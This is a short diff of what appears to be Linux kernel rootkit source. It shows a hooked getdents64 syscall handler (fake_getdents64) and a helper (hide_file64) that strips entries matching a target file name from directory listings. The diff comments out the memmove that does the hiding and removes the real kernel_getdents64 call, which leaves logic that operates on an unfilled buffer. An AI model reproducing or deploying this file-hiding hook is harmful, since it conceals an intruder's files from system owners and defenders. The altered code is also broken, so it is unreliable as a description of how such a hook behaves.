@@ -84,12 +84,12 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
         dp = (struct linux_dirent64 *)((unsigned long)dirp + cur_addr);
         
         if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
-            cur_reclen = dp->d_reclen;                              // Store the current length
-            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
-            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
-            
-            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
-            count -= cur_reclen;                                     // Modify the size
+//            cur_reclen = dp->d_reclen;                              // Store the current length
+//            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
+//            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
+//            
+//            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
+//            count -= cur_reclen;                                     // Modify the size
             
             printk("Hide %s success.\n", dp->d_name);
         }
@@ -103,7 +103,6 @@ asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *d
     long rv;
     
     rv = hide_file64(targetfile, dirp, count);
-    rv = kernel_getdents64(fd, dirp, count);
    
     return rv;
 }
